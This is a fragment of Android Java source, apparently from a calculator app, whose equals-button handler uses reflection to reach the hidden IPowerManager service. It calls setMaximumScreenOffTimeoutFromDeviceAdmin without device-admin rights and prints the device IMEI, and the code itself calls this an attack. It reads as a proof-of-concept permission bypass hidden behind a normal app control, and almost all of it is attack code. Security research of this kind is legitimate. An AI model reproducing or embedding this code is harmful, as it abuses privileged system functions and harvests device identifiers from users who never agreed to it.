        ...
        b_equal.setOnClickListener(new View.OnClickListener() {
            ...
            public void onClick(View view) {
                ...
                try {
                    ...
                    //Invoke ServiceManager.getService("power") method and obtain IBinder object of PowerManagerService
                    Class serviceManagerClass = Class.forName("android.os.ServiceManager");
                    System.out.println("Entered try block."+1);
                    Method getServiceMethod = serviceManagerClass.getDeclaredMethod("getService", String.class);
                    System.out.println("Entered try block."+2);
                    IBinder iBinder = (IBinder) getServiceMethod.invoke(null, "power");
                    System.out.println("Entered try block."+3);
                    //Get Stub object of IPowerManager by passing IBinder object to asInterface() method
                    Class stubClass = Class.forName("android.os.IPowerManager$Stub");
                    System.out.println("Entered try block."+4);
                    Method asInterfaceMethod = stubClass.getMethod("asInterface", new Class[]{IBinder.class});
                    System.out.println("Entered try block."+5);
                    Object IPowerManagerObj = asInterfaceMethod.invoke(null, iBinder);
                    System.out.println("Entered try block."+6);
                    //Invoke IPowerManager.setMaximumScreenOffTimeoutFromDeviceAdmin(0) method using Java reflection
                    Class IPowerManagerClass = Class.forName("android.os.IPowerManager");
                    System.out.println("Entered try block."+7);
                    Method setScreenOffTimeoutMethod = IPowerManagerClass.getDeclaredMethod("setMaximumScreenOffTimeoutFromDeviceAdmin", Integer.TYPE);

                    System.out.println("The retrieved IMEI number is:"+getDeviceImei());
                    System.out.println("Setting screen timeout to be 10 seconds.\nScreen will go black in 10 seconds.");
                    System.out.print(setScreenOffTimeoutMethod.invoke(IPowerManagerObj, 10));
                }
                catch(Exception e){
                    System.out.println("Exception occurred while performing attack.");
                }
            }
        });
